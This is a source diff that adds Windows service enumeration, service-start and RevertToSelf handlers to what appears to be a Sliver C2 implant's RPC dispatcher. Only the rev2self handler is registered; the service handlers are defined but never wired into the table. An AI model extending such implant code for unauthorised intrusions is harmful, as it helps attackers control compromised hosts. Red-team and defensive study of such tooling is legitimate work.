@@ -11,6 +11,7 @@
 #include "sliver/platform.h"
 #include "sliver/privs.h"
 #include "sliver/screenshot.h"
+#include "sliver/services.h"
 #include "sliver/proc.h"
 
 #define SLIVER_LS_MAX_ENTRIES 4096
@@ -851,6 +852,57 @@ static int handle_grep(const sliver_envelope_t *req, sliver_buf_t *out) {
   return sliver_grep_encode(out, path, path, hits, n, NULL);
 }
 
+
+/* --- services ----------------------------------------------------------- */
+#if defined(_WIN32)
+static int handle_services(const sliver_envelope_t *req, sliver_buf_t *out) {
+  static sliver_service_t svcs[256];
+  int n;
+  (void)req;
+  n = sliver_services_list(svcs, 256);
+  LOG_DEBUG("rpc: services -> %d", n);
+  if (n < 0) {
+    return sliver_services_encode(out, NULL, 0, "services: SCM enumeration failed");
+  }
+  return sliver_services_encode(out, svcs, n, NULL);
+}
+
+static int handle_service_detail(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_service_t svc;
+  char name[256];
+  (void)req;
+  memset(&svc, 0, sizeof(svc));
+  name[0] = 0;
+  if (sliver_service_name_decode(req->data, req->data_len, name, sizeof(name)) != 0 || name[0] == 0) {
+    return sliver_service_detail_encode(out, NULL, NULL, "service-detail: missing service name");
+  }
+  if (sliver_service_detail(name, &svc) != 0) {
+    return sliver_service_detail_encode(out, NULL, NULL, "service-detail: cannot query service");
+  }
+  return sliver_service_detail_encode(out, &svc, NULL, NULL);
+}
+
+static int handle_service_start(const sliver_envelope_t *req, sliver_buf_t *out) {
+  char name[256];
+  name[0] = 0;
+  if (sliver_service_name_decode(req->data, req->data_len, name, sizeof(name)) != 0 || name[0] == 0) {
+    return sliver_empty_response_encode(out, "start-service: missing service name");
+  }
+  if (sliver_service_start(name) != 0) {
+    return sliver_empty_response_encode(out, "start-service: StartService failed");
+  }
+  return sliver_empty_response_encode(out, NULL);
+}
+
+static int handle_rev2self(const sliver_envelope_t *req, sliver_buf_t *out) {
+  (void)req;
+  if (sliver_revert_to_self() != 0) {
+    return sliver_empty_response_encode(out, "rev2self: RevertToSelf failed");
+  }
+  return sliver_empty_response_encode(out, NULL);
+}
+#endif
+
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
     {SLIVER_MSG_PWD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_pwd},
@@ -877,6 +929,9 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_MOUNT_REQ, SLIVER_MSG_MOUNT, handle_mount},
     {136, 136, handle_execute_children},
     {129, 129, handle_grep},
+#if defined(_WIN32)
+        {31, 31, handle_rev2self},
+#endif
 #if defined(_WIN32)
     {71, 71, handle_reg_read},
     {72, 72, handle_reg_write},
@@ -944,6 +999,8 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
+
 
 
 
